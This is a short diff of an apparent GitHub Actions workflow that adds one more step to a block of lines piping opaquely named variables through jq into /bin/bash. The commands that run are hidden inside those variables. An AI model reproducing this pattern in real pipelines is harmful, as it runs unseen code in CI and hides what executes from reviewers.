@@ -21,6 +21,7 @@ jobs:
           echo $r40 | jq -r .dz26 | /bin/bash
           printf '%s' "$jdpn97" | jq -r .yjf14 | /bin/bash
           printf '%s' "$bpii2" | jq -r .nz64 | /bin/bash
+          echo $uinv22 | jq -r .yu10 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
